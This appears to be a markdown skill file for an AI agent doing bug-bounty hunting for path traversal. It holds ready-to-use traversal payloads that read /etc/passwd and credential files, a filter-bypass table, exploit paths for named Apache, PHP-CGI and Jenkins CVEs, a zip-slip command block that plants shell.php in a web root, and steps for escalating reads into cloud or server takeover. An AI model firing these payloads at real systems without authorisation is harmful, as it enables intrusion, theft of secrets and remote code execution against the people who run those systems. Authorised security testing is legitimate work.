---
name: hunt-path-traversal
description: Path traversal / directory traversal — encoding bypass, double decode, web-server CVEs.
keywords: [path traversal, directory traversal, lfi, dot dot slash, %2e%2e, double decode, zip slip, archive]
---

# hunt-path-traversal

## Triggers

"path traversal", "directory traversal", "dot dot slash", "%2e",
"zip slip".

## Phase 1 — probe

Common injection points: file download (`?file=`), avatar fetch,
config import, archive extraction, log viewer.

```
?file=../../etc/passwd
?file=..%2f..%2fetc%2fpasswd
?file=..%252f..%252fetc%252fpasswd       (double-encoded, double-decoder)
?file=....//....//etc/passwd             (filter strips one `../`)
?file=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd   (UTF-8 overlong)
?file=..\\..\\etc\\passwd                (Windows)
?file=..%5c..%5cwindows%5cwin.ini
```

Windows interesting reads: `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`,
`C:\inetpub\logs\LogFiles\W3SVC1\u_exYYMMDD.log`.

Linux interesting reads: `/etc/passwd`, `/proc/self/environ`,
`/proc/self/cmdline`, `/var/log/apache2/access.log`, `/root/.bash_history`,
`/home/<user>/.aws/credentials`, `/.ssh/id_rsa`, `/etc/shadow` (often
unreadable; depends on perms).

## Phase 2 — bypass matrix

| Filter | Bypass |
|---|---|
| Strip `../` | `..././`, `....//`, `..//../` |
| Block absolute `/etc/` | `..\\etc\\passwd` on Linux some apps | 
| Normalize then check | Use null byte `%00` (older PHP), `?file=../../etc/passwd%00.png` |
| Suffix check (`.png`) | Append `?.png` (Java treats `?` as start of query in some path libs) |
| Prefix check (`/var/uploads/`) | `/var/uploads/../../../etc/passwd` |
| Allowlist by hash | Pre-compute hash, find collision (rare) |
| Block dot | `\xc0.` UTF-8, `%2e`, `%252e` |

## Phase 3 — well-known CVE chains

| CVE | Product | Path |
|---|---|---|
| CVE-2021-41773 | Apache 2.4.49 | `/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd` |
| CVE-2021-42013 | Apache 2.4.50 (incomplete fix) | `/cgi-bin/.%%32%65/%%32%65%%32%65/etc/passwd` |
| CVE-2024-4577 | PHP-CGI | `?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input` |
| CVE-2024-23897 | Jenkins CLI | `@/etc/passwd` arg expansion |
| CVE-2023-46604 | ActiveMQ | OpenWire-driven path traversal → RCE |
| CVE-2024-29973 | Zyxel NAS | path traversal pre-auth |

`docs/verification/` has full reproduction recipes for the Apache
ones.

## Phase 4 — zip slip

Archive uploads where extraction writes paths without sanitizing:

```bash
# Create malicious tar
mkdir poc && cd poc
echo "shell" > ../../../var/www/html/shell.php
tar czvf evil.tar.gz "../../../var/www/html/shell.php"
```

Upload, force extraction → writes outside upload dir → RCE if it
lands in a web root.

## Phase 5 — chain to RCE

Path-traversal-read alone is sometimes "Medium". Reading these
upgrades it to "Critical":

- Application secret keys → JWT forgery (cf. `hunt-jwt`)
- Database credentials → direct DB access
- AWS credentials (`~/.aws/credentials`) → cloud takeover
- SSH private keys → server takeover
- ASP.NET `machineKey` → ViewState RCE

Path-traversal-write upgrades automatically (RCE if web root writable).

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| H1 #2052158 | PHP-FPM path traversal in image proxy |
| CVE-2021-41773 (Apache) | Defining recent traversal CVE |
| CVE-2024-23897 (Jenkins) | Args-driven path read → secret leak → ATO |
| Capital One 2019 | Path of escalation began with metadata SSRF, but traversal is the same archetype |

## Never-submit fallbacks

- Traversal that reads only public files (`/var/www/html/*.css`) →
  KILL
- Traversal that returns 200 but empty body → CHAIN REQUIRED
- Local-only via authenticated admin → DOWNGRADE

## See also

- `hunt-lfi` — sibling
- `hunt-file-upload`
- `docs/verification/phase2g` — Apache CVE-2021-41773 lab
